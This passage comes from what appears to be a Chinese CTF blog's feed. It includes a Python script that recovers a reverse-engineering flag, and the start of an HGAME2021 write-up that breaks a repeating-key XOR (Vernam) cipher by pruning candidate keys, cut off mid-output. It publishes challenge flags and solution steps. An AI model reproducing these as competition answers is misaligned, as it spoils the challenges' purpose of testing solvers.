&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;encry &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;3_isjA0UeQZcNa&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Vf&amp;#39;&lt;/span&gt;
flag_1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; []
t &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; encry:
    flag_1&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;append(i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; t)
    t &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
print (flag_1)

rand &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [&lt;span style=&#34;color:#ae81ff&#34;&gt;0x44&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x32&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;0x5d&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x39&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x27&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x30&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; [&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;
flag &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(len(flag_1)):
    flag &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; chr(flag_1[i] &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; (rand[i] &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xff&lt;/span&gt;))

print (flag)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;得到最终的flag&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;56&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;101&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;112&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;123&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;115&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;75&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;59&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;97&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;114&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;95&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;105&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;115&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;95&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;115&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;111&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;116&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;113&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;108&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;125&lt;/span&gt;]
Nep{solar_is_sotql}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;worrrrms-go语言逆向&#34;&gt;worrrrms （go语言逆向）&lt;/h2&gt;
&lt;p&gt;只知道用了SM4算法加密，不会go语言，具体的看不懂，爬了。&lt;/p&gt;
&lt;h2 id=&#34;总结&#34;&gt;总结&lt;/h2&gt;
&lt;p&gt;这个比赛的前五道题其实就是各个方向的入门题目，有相应的工具并且能够看懂伪代码就可以做了，只需要进行静态分析。做go语言的时候发现go的函数调用太奇怪了，而且有各种指针，不愧是最安全的语言。&lt;/p&gt;
&lt;p&gt;至于后面的几道题，由于解的人太少，也就没有去看，看完wp再补。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>HGAME2021 Vernam and FAKE</title>
        <link>/post/hgame2021-vernam-and-fake/</link>
        <pubDate>Wed, 17 Mar 2021 20:06:09 +0000</pubDate>
        
        <guid>/post/hgame2021-vernam-and-fake/</guid>
        <description>&lt;h2 id=&#34;对称之美&#34;&gt;对称之美&lt;/h2&gt;
&lt;h3 id=&#34;题目&#34;&gt;题目&lt;/h3&gt;
&lt;p&gt;Vernam 密码&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; random
&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; string
&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; itertools
&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; secret &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; FLAG

key &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;join(random&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;choices(string&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ascii_letters &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; string&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;digits, k&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;))

cipher &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; bytes([ord(m)&lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt;ord(k) &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; m, k &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; zip(FLAG, itertools&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;cycle(key))])

print(cipher)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;思路&#34;&gt;思路&lt;/h3&gt;
&lt;p&gt;由于给了大量的密文，完全可以对密钥空间进行范围上的缩小。&lt;/p&gt;
&lt;p&gt;由于进行的是异或操作，且明文与密钥均为可见字符，只需要对相同位置的密文与所有可能的密钥字符进行异或计算，结果不在可见字符范围内的均可以排除掉。&lt;/p&gt;
&lt;p&gt;经过初步筛选后密钥空间会小很多，进行爆破或者根据上下文手动选择即可。&lt;/p&gt;
&lt;h3 id=&#34;代码&#34;&gt;代码&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; string
&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; itertools

key &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; string&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ascii_letters &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; string&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;digits

&lt;span style=&#34;color:#75715e&#34;&gt;# first = [94, 116, 57, 32, 54, 49, 33, 32, 54, 38, 116, 59, 37, 32, 32, 116, 60, 32, 57, 59, 51, 34, 38, 39, 116, 59, 116, 38, 60, 61, 35, 58, 39, 55, 59, 116, 49, 32, 48, 39, 55, 94, 59, 116, 38, 39, 116, 50, 59, 53, 48, 122, 60, 94, 116, 61, 54, 38, 38, 32, 39, 116, 56, 59, 53, 97, 1]&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# first = [35, 25, 21, 25, 17, 2, 28, 3, 5, 21, 17, 3, 5, 80, 80, 18, 25, 31, 21, 31, 94, 21, 80, 4, 24, 31, 17, 3, 17, 4, 80, 80, 25, 17, 3, 0, 9, 24, 9, 25, 24, 17, 30, 3, 9, 80, 17, 17, 2, 80, 31, 80, 80, 22, 3, 3, 25, 9, 21, 24, 80, 17, 21, 80, 23, 93, 62]&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# first = [78, 68, 89, 89, 91, 23, 83, 23, 67, 91, 89, 94, 82, 69, 78, 66, 89, 23, 67, 92, 23, 69, 67, 23, 86, 92, 89, 23, 83, 27, 67, 85, 84, 91, 82, 69, 25, 94, 23, 89, 94, 65, 23, 89, 23, 88, 23, 84, 23, 91, 64, 110, 68, 86, 78, 23, 91, 23, 23, 82, 61, 71, 68, 95, 13, 86, 89]&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# first = [43, 102, 50, 33, 39, 76, 102, 50, 102, 39, 34, 50, 53, 35, 41, 53, 34, 53, 52, 102, 76, 39, 46, 47, 52, 102, 37, 43, 102, 102, 46, 41, 39, 106, 102, 35, 102, 53, 49, 33, 40, 41, 50, 39, 54, 52, 42, 35, 76, 47, 40, 41, 47, 37, 43, 47, 39, 39, 36, 52, 34, 54, 53, 35, 102, 25, 63]&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# first = [3, 25, 29, 78, 0, 1, 12, 6, 7, 26, 78, 7, 64, 15, 27, 23, 78, 11, 23, 15, 58, 2, 7, 29, 10, 8, 7, 15, 100, 12, 15, 10, 2, 78, 1, 10, 100, 78, 6, 78, 9, 7, 6, 28, 15, 78, 1, 78, 15, 0, 78, 27, 10, 11, 3, 29, 26, 0, 1, 78, 7, 11, 78, 28, 100, 27, 49]&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# first = [31, 18, 90, 21, 25, 15, 31, 31, 14, 31, 112, 21, 112, 22, 8, 90, 14, 31, 90, 14, 18, 90, 9, 90, 87, 21, 31, 3, 27, 15, 14, 19, 22, 27, 28, 27, 46, 25, 31, 27, 90, 30, 31, 22, 25, 24, 21, 19, 20, 31, 14, 93, 31, 90, 31, 90, 31, 30, 14, 9, 12, 27, 14, 31, 18, 41, 57]&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# first = [69, 84, 94, 67, 84, 69, 17, 92, 17, 17, 94, 95, 104, 88, 17, 70, 89, 90, 70, 17, 84, 67, 31, 69, 70, 67, 95, 17, 17, 69, 17, 84, 72, 66, 17, 69, 89, 80, 69, 17, 85, 88, 17, 88, 90, 84, 90, 95, 85, 17, 89, 93, 66, 80, 69, 59, 67, 17, 89, 88, 88, 67, 89, 17, 86, 2, 0]&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# first = [65, 93, 85, 19, 19, 29, 71, 64, 80, 71, 71, 82, 92, 73, 81, 92, 86, 19, 91, 82, 65, 86, 19, 91, 90, 19, 71, 93, 93, 19, 71, 64, 19, 19, 67, 92, 86, 94, 91, 94, 90, 93, 94, 93, 19, 82, 19, 19, 19, 64, 86, 95, 19, 65, 65, 88, 82, 90, 19, 87, 87, 19, 86, 90, 82, 85, 67]&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# first = [49, 104, 104, 44, 45, 104, 32, 45, 41, 39, 32, 36, 61, 45, 58, 58, 104, 66, 45, 104, 45, 41, 28, 41, 58, 66, 104, 39, 41, 60, 32, 104, 59, 66, 39, 58, 58, 45, 45, 41, 38, 47, 45, 47, 39, 58, 41, 60, 33, 60, 104, 104, 39, 45, 33, 38, 36, 60, 59, 45, 33, 37, 104, 59, 37, 29, 0]&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# first = [119, 35, 93, 37, 54, 3, 50, 59, 57, 119, 50, 119, 119, 119, 54, 60, 36, 56, 57, 39, 119, 36, 63, 35, 50, 62, 54, 35, 58, 63, 50, 32, 46, 32, 35, 36, 50, 119, 37, 35, 57, 119, 57, 123, 49, 36, 35, 63, 58, 37, 93, 36, 49, 119, 52, 56, 119, 112, 62, 119, 57, 56, 36, 119, 50, 102, 100]&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# first = [57, 56, 49, 49, 51, 56, 112, 38, 112, 51, 34, 36, 61, 57, 57, 57, 51, 37, 112, 49, 49, 63, 53, 112, 52, 36, 62, 112, 53, 53, 57, 53, 61, 53, 53, 112, 54, 57, 112, 53, 53, 50, 37, 112, 112, 113, 112, 53, 49, 49, 61, 53, 112, 32, 49, 39, 35, 35, 52, 63, 55, 34, 49, 36, 43, 123, 34]&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# first = [87, 92, 25, 78, 81, 80, 86, 92, 88, 86, 25, 92, 88, 77, 87, 87, 92, 77, 64, 80, 75, 87, 25, 78, 25, 23, 90, 81, 25, 64, 75, 75, 84, 75, 87, 86, 86, 87, 51, 21, 75, 92, 25, 51, 78, 51, 64, 25, 94, 80, 80, 92, 64, 75, 85, 87, 64, 25, 92, 95, 25, 92, 84, 81, 97, 13, 68]&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# first = [65, 65, 17, 8, 65, 18, 3, 18, 13, 13, 2, 2, 24, 77, 65, 6, 15, 65, 14, 15, 4, 18, 107, 4, 21, 65, 4, 0, 7, 65, 65, 4, 4, 4, 21, 19, 19, 65, 2, 65, 65, 8, 14, 9, 14, 53, 14, 12, 8, 6, 5, 65, 14, 4, 79, 65, 12, 107, 18, 65, 13, 65, 4, 4, 81, 15, 107]&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# first = [57, 61, 57, 54, 55, 120, 50, 116, 43, 55, 55, 48, 120, 120, 82, 120, 61, 43, 45, 44, 120, 120, 62, 127, 55, 23, 43, 46, 55, 51, 82, 120, 44, 120, 49, 120, 61, 48, 48, 59, 55, 54, 62, 45, 52, 57, 45, 49, 54, 48, 60, 58, 45, 44, 120, 57, 53, 47, 120, 44, 49, 55, 118, 120, 42, 60]&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# first = [5, 27, 30, 16, 3, 20, 18, 87, 24, 5, 26, 25, 25, 21, 30, 21, 4, 14, 87, 30, 4, 17, 30, 5, 87, 2, 3, 18, 5, 25, 24, 21, 5, 3, 22, 7, 91, 22, 24, 22, 5, 16, 87, 25, 1, 28, 5, 5, 18, 3, 27, 24, 5, 3, 35, 4, 18, 31, 18, 31, 25, 5, 125, 17, 40, 83]&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# first = [38, 55, 60, 114, 58, 61, 49, 88, 114, 33, 34, 59, 61, 39, 33, 55, 114, 63, 62, 60, 55, 61, 32, 55, 62, 32, 61, 114, 114, 55, 37, 51, 59, 58, 62, 32, 114, 60, 61, 38, 114, 114, 51, 53, 55, 55, 114, 32, 114, 114, 55, 38, 114, 43, 58, 114, 38, 55, 59, 59, 55, 114, 1, 62, 59, 52]&lt;/span&gt;

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;test&lt;/span&gt;(char):
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; c &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; first:
        num &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ord(char) &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; c
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (num &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x20&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;or&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x7f&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; num) &lt;span style=&#34;color:#f92672&#34;&gt;and&lt;/span&gt; num &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0a&lt;/span&gt;: &lt;span style=&#34;color:#75715e&#34;&gt;# 可能出现换行符&lt;/span&gt;
            &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;False&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;

&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; c &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; key:
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (test(c)):
        print (c, end &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; &amp;#39;&lt;/span&gt;)
print()

&lt;span style=&#34;color:#75715e&#34;&gt;# T&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# b d e k l o p q r s t u w x y      final: p&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 7&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# F&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# n&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# z&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# b 1&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# a c d e f g h i j k m n o p q r s t u v w x y z 0 1 2 3 4 5 7 9      final: 3&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# H&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# W&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# C D E O P Q R S U V W             final: P&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# k 9&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# a&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# X&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# w&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# x R&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;将密文每十六个分一组，每一组相同位置对应的密钥应该是同一个，因此将这些密文字符组成一个 &lt;code&gt;list&lt;/code&gt;，这里命名为 &lt;code&gt;first&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;对每一个位置进行密钥的初筛，最终可以得到代码块下面的注释所示的密钥空间&lt;/p&gt;
&lt;p&gt;随便选择一组密钥进行解密运算&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;key &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Tp7Fnz13HWP9aXwR&amp;#39;&lt;/span&gt;
a &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (bytes([m &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; ord(k) &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; m, k &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; zip(cipher, itertools&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;cycle(key))]))
print (a)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;对这些密钥进行手动筛查并更新密钥即可，过程如下。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Lymmet y zn Art vs whe&amp;lt; t{e Elemznts o4 &lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;r pAintvng orrdrrwiNg b~lancereaph Othem &lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;out| T{is&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;cousd be &amp;amp;he3obJectl them!elees&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x0c&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;bjt it 1an3alSo rzlate &amp;amp;o polOrs ~nd &lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;o&amp;amp;hea cOmpolition3l gecHniqjes.&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Y=u ~ay&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;not?reali(e zt,&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;but?your 0razn *is }usy w=rkzng&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;behvnd th7 spenEs tp seekr&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;oft Symmztry w:en3yoU lopk at 3 prinTing1 &lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;The e rre&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;sevzral r7as|ns&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;for?this.rThv &lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Firsk is t:at3we&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x07&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;re ward-w;rew tO lopk forr&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;ig. our ~ncien&amp;amp; a}ceStorl may &amp;lt;ot3haVe h~d &lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;a &amp;lt;amv fOr ik, butrthvy Knew?that &amp;amp;hezr *own?bodie! wvre&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;basvcallyrsy~meTric~l, asr&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;wvre&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;thole of &amp;#34;otvntIal oredat=rs3or&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;pref. &lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Th7reuorE, twis ca?e zn Handf whet:er3&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;cHoosvng a ?atv, Catcwing d;nnvr Or &lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;~voidi&amp;lt;g qeiNg oq the ?enf oF a lnarli&amp;lt;g,3&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;hUngrf packrof3woLves?or be3rs2&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;TAke ~ lookrat3yoUr f~ce inrthv mIrrom &lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;andrimrgiNe a?line !trrigHt dpwn th7 &lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;~idDle.?You&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;l&amp;gt; sve Both?sidesrof3yoUr &lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;yace a e creTty lymmet icrl.&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Thil is &lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;9nodn As bvlater3l `ymMetrf and ;t&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;` &lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Wherz bothrsiwes&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;eitwer si6e |f This?&lt;/span&gt;&lt;span 